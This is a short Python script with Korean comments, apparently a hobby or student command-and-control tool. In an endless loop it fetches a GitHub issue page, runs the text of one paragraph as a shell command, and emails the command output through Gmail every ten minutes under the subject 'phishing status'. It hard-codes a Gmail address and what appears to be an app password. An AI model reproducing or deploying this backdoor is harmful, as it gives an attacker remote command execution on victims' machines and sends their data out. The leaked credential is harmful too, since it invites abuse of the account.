import requests, time, os
from bs4 import BeautifulSoup  #크롤링 라이브러리
import smtplib
from email.mime.text import MIMEText  # 이메일 보낼때 시스템//smtp를 이용함


while True:  #무한루트로 실행시킴
    html = requests.get("https://github.com/goodmentos/CCIT_C-C/issues/3")
    soup = BeautifulSoup(html.text, "html.parser")
    # html,soup함수로 github링크를 크롤링해서 안에 소스코드를 가져오는것.soup변수에 넣기  
    github = soup.select("p")
    # soup 소스코드에서 p 태그 찾기
    textname = github[3].text
    # p태그 3번째 있는것을 textname 변수안에 넣기
    os.system(textname)
    # os.system으로 textname에 있는 변수를 cmd로 실행시킴
    result = os.popen(textname).read()
    # result 안에 textname을 cmd로 실행시킨 값을 넣어주기
    
    
    # 파일에 저장(result에 있는 값)
    #if result:
        # file_object = open("test","x")
    #    f=open("test.txt","w")    
    #    f.write(result)
    #    f.close()
    #else:
    #    print("입력값이 없습니다.")
    
    # smtp를 이용한 gmail로 result에 있는값 전송
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login('a01093622070@gmail.com', 'lxgtergwgdfrdywm')
    msg = MIMEText(result)
    msg['Subject'] = '피싱현황'
    s.sendmail("a01093622070@gmail.com", "a01093622070@gmail.com", msg.as_string())
    s.quit()
        
    time.sleep(600)
